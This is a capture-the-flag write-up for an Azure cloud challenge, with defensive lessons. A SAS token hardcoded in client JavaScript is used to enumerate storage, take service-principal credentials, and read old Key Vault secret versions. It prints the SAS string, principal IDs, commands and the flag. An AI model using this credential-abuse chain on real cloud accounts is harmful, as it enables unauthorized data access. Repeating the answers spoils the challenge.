# Day 9 — CryptoCabana

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed (2026-08-04)
- **Target:** `https://cryptocabanaf5scjagc.z13.web.core.windows.net/` — an **Azure Storage static website** ("CryptoCabana", a seed-phrase backup kiosk). Backing storage account: **`cryptocabanaf5scjagc`**.
- **Category:** Cloud (Medium, 90 pts) — Azure · Storage · Key Vault
- **Objective:** _"Find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends."_ Recover the real seed phrase / flag.
- **Story hook:** _"He'd backed his seed phrase up... into the CryptoCabana kiosk's vault — the one whose landing page promised, in exactly four words, 'Backed up. Sleep easy.'"_ + itinerary: (1) _"pull apart what the kiosk hands out for free before you've even clicked anything"_ → client-side JS; (2) _"follow that trust somewhere the kiosk's own page never once points you"_ → an unlinked container; (3) _"a second, more valuable set of keys — and a vault that won't give up the real values on the first ask"_ → Key Vault + versioning. @0xMia's tip: _"if a value looks freshly rotated, ask yourself what it looked like five minutes before that"_ → **Key Vault secret version history**.
- **Vulnerability:** **Over-privileged Azure Storage SAS token hardcoded in client-side JavaScript.** The page's `app.js` embeds an account SAS scoped `ss=b&srt=sco&sp=rl` — **read + list** across the whole blob service — while the kiosk only ever uses it to `PUT` (write) backups. That list/read power exposes an unlinked `vault` container holding a **service-principal credential file**, which in turn grants access to an Azure **Key Vault**. The secrets were "rotated" after IT flagged the leak, but Key Vault **retains old secret versions**, so the real values are still recoverable.
- **Attack path (summary):**
  1. **Itinerary #1 — read the free handout (client JS):** `view-source` on the kiosk exposed `app.js`, which hardcodes `STORAGE_ACCOUNT`, `BACKUPS_CONTAINER`, and a long-lived `BACKUP_SAS`. Decoding the SAS params: `ss=b` (blob), `srt=sco` (service/container/object level), `sp=rl` (**read + list**), `se=2099-12-31` (never expires). The page only ever does a `PUT`, but the token can **list and read the entire account**.
  2. **Itinerary #2 — follow the trust off-page (list containers):** used the SAS's service-level list to enumerate containers → `$web`, `backups`, and **`vault`** (the last never referenced anywhere on the site).
  3. **Read the `vault` container:** listed blobs → `backup-service-account.json` and `seed_phrase.txt`. The txt held a **decoy** 12-word phrase (`velvet cabana rebuild scatter...`). The JSON leaked a **service principal** (`client_id` / `client_secret` / `tenant_id`) plus `key_vault_name: ccabana-kv-f5scjagc` — with an IT note: _"Rotate this if it ever leaves the vault."_
  4. **Itinerary #3 — into the Key Vault:** logged in as the leaked SP (`az login --service-principal`) and listed secrets → `key-shard-1/2/3` (readable) and `master-key` (access denied, and expired 2020). The flag is split across the three shards.
  5. **The versioning twist:** `key-shard-1` = `THM{n0t_ur`, `key-shard-3` = `ur_c01ns!}`, but **`key-shard-2`'s current value was a decoy note** (_"Rotated this after IT flagged it — old value should still be recoverable if you know where to look."_). Ran `az keyvault secret list-versions` on `key-shard-2` → two versions seconds apart; the **older version** (`3d6492d2...`, created `01:05:05`, one tick before the `01:05:07` decoy) held the real middle piece: `_k3ys_n0t_`.
  6. **Assemble:** shard-1 + shard-2(old) + shard-3.
- **Flag:** <details><summary>click to reveal</summary><code>THM{n0t_ur_k3ys_n0t_ur_c01ns!}</code></details> — spells out the crypto adage "**not your keys, not your coins**."
- **Lessons:**
  - **Never ship SAS tokens (or any credential) in client-side JavaScript** — anything the browser can read, an attacker can read.
  - **Least privilege on SAS:** this token only needed **write** to one container, but was minted with account-wide **read + list** (`srt=sco`, `sp=rl`) and a **2099 expiry**. Scope tokens to the exact container, permission, and a short lifetime; prefer user-delegation SAS or a stored access policy that can be revoked.
  - **Don't store service-principal secrets in a readable blob** — the `vault` container turned one leaked SAS into full Key Vault access.
  - **"Rotating" a leaked Key Vault secret does not erase it** — old versions persist in version history and are readable with `secret/get` unless explicitly disabled/destroyed. After a leak, **disable/destroy prior versions** (or purge), not just add a new one.
  - **Don't rely on unlinked/unlisted resources for secrecy** (security through obscurity) — the `vault` container wasn't referenced anywhere, but `list` permission surfaced it instantly.

## Walkthrough (PowerShell + Azure CLI)

```powershell
# --- Setup: the SAS lifted straight from the kiosk's app.js ---
$acct = "cryptocabanaf5scjagc"
$sas  = 'sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'

# 1) List ALL containers (service-level list) -> reveals the unlinked 'vault'
$raw = Invoke-WebRequest "https://$acct.blob.core.windows.net/?comp=list&$sas"
([xml]$raw.Content).EnumerationResults.Containers.Container.Name   # $web, backups, vault

# 2) List blobs in 'vault'
$raw = Invoke-WebRequest "https://$acct.blob.core.windows.net/vault`?restype=container&comp=list&$sas"
([xml]$raw.Content).EnumerationResults.Blobs.Blob.Name            # backup-service-account.json, seed_phrase.txt

# 3) Read the loot
Invoke-RestMethod "https://$acct.blob.core.windows.net/vault/backup-service-account.json`?$sas"  # SP creds + key_vault_name
Invoke-RestMethod "https://$acct.blob.core.windows.net/vault/seed_phrase.txt`?$sas"             # decoy phrase

# 4) Authenticate as the leaked service principal
az login --service-principal `
  --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" `
  --password "<client_secret>" `
  --tenant   "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"

# 5) Read the shard secrets
$vault = "ccabana-kv-f5scjagc"
az keyvault secret list --vault-name $vault -o table
az keyvault secret show --vault-name $vault --name key-shard-1 --query value -o tsv   # THM{n0t_ur
az keyvault secret show --vault-name $vault --name key-shard-3 --query value -o tsv   # ur_c01ns!}

# 6) key-shard-2 is a decoy -> pull the PREVIOUS version
az keyvault secret list-versions --vault-name $vault --name key-shard-2 `
  --query "sort_by([], &attributes.created)[].{ver:id, created:attributes.created}" -o table
az keyvault secret show --vault-name $vault --name key-shard-2 `
  --version "3d6492d2c6f74123bc754a9ded22b2a0" --query value -o tsv                   # _k3ys_n0t_
```

## Key facts

| Item | Value |
| ---- | ----- |
| Kiosk (static site) | `https://cryptocabanaf5scjagc.z13.web.core.windows.net/` |
| Storage account | `cryptocabanaf5scjagc` |
| Leak location | `app.js` (client-side) — hardcoded account SAS |
| SAS scope | `ss=b srt=sco sp=rl se=2099-12-31` (read+list, account-wide, never expires) |
| Containers | `$web`, `backups`, **`vault`** (unlinked) |
| Loot blobs | `vault/backup-service-account.json` (SP creds), `vault/seed_phrase.txt` (decoy) |
| Service principal | `dbcf2923-e4eb-4b72-a0a4-688aa1185cf5` (tenant `8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c`) |
| Key Vault | `ccabana-kv-f5scjagc` |
| Secrets | `key-shard-1/2/3` (readable), `master-key` (denied) |
| The twist | `key-shard-2` current = decoy; **older version** `3d6492d2...` = real value |
| Flag pieces | `THM{n0t_ur` + `_k3ys_n0t_` (old ver) + `ur_c01ns!}` |
